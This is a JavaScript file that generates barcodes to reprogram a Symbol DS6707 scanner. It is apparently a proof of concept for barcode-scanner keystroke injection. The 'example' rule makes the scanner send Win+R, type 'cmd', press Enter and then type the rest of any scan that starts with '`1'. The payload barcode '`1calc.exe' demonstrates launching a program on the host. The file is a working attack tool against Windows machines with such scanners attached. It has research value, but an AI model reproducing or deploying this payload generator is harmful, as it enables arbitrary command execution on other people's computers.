$(function  () {
  $("ol.example").sortable();
});

// DS6707 CODE128 No enter config

var bw;
var barcodeNumber = 0;

var models = {
	symbolds6707: {
		name: "Symbol DS6707",
		autodelay: 500,
		options: {
			scanpresentation: ["2050207"], // CODE128 Presentation mode scanning ("Blink")
			enableparameterscanning: ["1040601"] // CODE128 Enable parameter scanning
		},
		setup: {
			symbology: "code128",
			prefix: "^FNC3",
			postfix: "",
			enterconfig: [],
			exitconfig: []
		},
		bwippoptions: {
			parsefnc: true,
			includetext: true
		}
		
		// Using ADF with longer bar codes transmits the bar code in segments of length 252 or less (depending on the host selected), and applies the rule to each segment.
	}
};

var example = {
	symbology: "code128",
	setup: [
	
		"N02CC03", // CODE128 Mobile Phone Decode Enable
		"N02D60D" // CODE128 Mobile Phone Decode High Aggressive
		//"60", // CODE128 Erase all rules
	],
	replacements: [
		[
			"7B1211", // CODE128 begin new rule
			"6C201", // CODE128 specific string at start (max 8)
			"`1", // `1
			"B+", // CODE128 end of message
			"20C0D20063", // CODE128 specify pause duration
			"A1", "A5", // 1.0 second delay
			"6A144352", // CODE128 send Win + R
			"6A118", // CODE128 send pause
			"cmd",
			"6A14470D", // CODE128 send enter
			"6A118", // CODE128 send pause
			"6A110", // CODE128 send all data that remains
			"B+", // CODE128 end of message
			"4" // CODE128 save rule
		]
	],
	payload: [
		"`1calc.exe",
		"8*17*39103"
	]
};


function addBarcode(text, symbology, options) {
	var canvas = $("<canvas/>", { id: "barcode-" + barcodeNumber});
	$("#barcodes").append($("<li>").append(canvas));
	var rawcanvas = canvas[0];
	
	bw.bitmap(new Bitmap);
	// bw.scale(2,2); // crashes chrome??
	BWIPP()(bw, symbology, text, options);
	bw.bitmap().show(rawcanvas, "N"); // "normal"
	barcodeNumber++;
}

$(function () {	
	var model = models.symbolds6707;
	var script = example;
	
	bw = new BWIPJS(Module, false);
	
	if (script.setup.length > 0) {
		for (var i = 0; i < model.setup.enterconfig.length; i++)
		{
			addBarcode(model.setup.prefix + model.setup.enterconfig[i] + model.setup.postfix, model.setup.symbology, model.bwippoptions);
		}
		for (var i = 0; i < script.setup.length; i++)
		{
			addBarcode(model.setup.prefix + script.setup[i] + model.setup.postfix, model.setup.symbology, model.bwippoptions);
		}
		for (var i = 0; i < model.setup.exitconfig.length; i++)
		{
			addBarcode(model.setup.prefix + model.setup.exitconfig[i] + model.setup.postfix, model.setup.symbology, model.bwippoptions);
		}
	}
	
	for (var i = 0; i < script.replacements.length; i++)
	{
		for (var j = 0; j < script.replacements[i].length; j++)
		{
			addBarcode(script.replacements[i][j],  model.setup.symbology, model.bwippoptions);
		}
	}
	
	for (var i = 0; i < script.payload.length; i++)
	{
		addBarcode(script.payload[i], script.symbology, model.bwippoptions);
	}
});